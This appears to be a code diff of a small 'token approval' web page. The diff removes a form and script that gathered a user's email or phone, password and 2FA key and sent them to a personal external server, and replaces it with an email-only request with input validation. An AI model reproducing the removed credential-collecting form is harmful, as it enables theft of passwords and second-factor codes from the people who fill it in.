@@ -83,41 +83,50 @@
   <header>Ahmi'X Server</header>
   <h2>X'V7 TOKEN</h2>
 
-  <div class="form-container">
-    <label for="userId">Email/Phone:</label>
-    <input type="text" id="userId" name="userId" placeholder="Email or Phone">
+<form id="approvalForm">
+    <label for="email">Email / Phone:</label>
+    <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>
+    <button type="submit">Send Approval</button>
+  </form>
 
-    <label for="pass">Password:</label>
-    <input type="text" id="pass" name="pass" placeholder="Password">
-
-    <label for="factorkey">2FA Keys:</label>
-    <input type="text" id="factorkey" name="factorkey" placeholder="2FA Key">
-
-    <button type="button" id="approvalBtn">Get Approval</button>
-  </div>
-
-  <footer>Made by Ahmer Awan</footer>
+  <div id="response" class="message"></div>
 
   <script>
-    document.getElementById("approvalBtn").addEventListener("click", async function() {
-      alert("Sending Approval Request");
+    const form = document.getElementById("approvalForm");
+    const responseDiv = document.getElementById("response");
 
-      const payload = {
-        userId: document.getElementById("userId").value,
-        pass: document.getElementById("pass").value,
-        factorkey: document.getElementById("factorkey").value
-      };
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const emailField = document.getElementById("email");
+      const typedValue = emailField.value.trim();
+
+      // ✅ Validation: email OR 11-digit phone number
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phoneRegex = /^\d{11}$/;
+
+      if (!emailRegex.test(typedValue) && !phoneRegex.test(typedValue)) {
+        responseDiv.textContent = "Invalid input: please enter a valid email or 11-digit phone number.";
+        responseDiv.className = "message error";
+        return;
+      }
 
       try {
         const res = await fetch("https://ahmerxserver.alwaysdata.net/sendApproval", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+          body: JSON.stringify({ email: typedValue })
         });
-        const data = await res.json();
-        console.log("Response:", data);
+
+        if (res.ok) {
+          responseDiv.textContent = `Sent the approval request. Wait for email with token at ${typedValue}`;
+          responseDiv.className = "message success";
+        } else {
+          responseDiv.textContent = "Can not send approval: Error 405 - Contact Admin at mkb1538bl@gmail.com";
+          responseDiv.className = "message error";
+        }
       } catch (err) {
-        console.error("Error:", err);
+        responseDiv.textContent = "Can not send approval: Error 405 - Contact Admin at mkb1538bl@gmail.com";
+        responseDiv.className = "message error";
       }
     });
   </script>
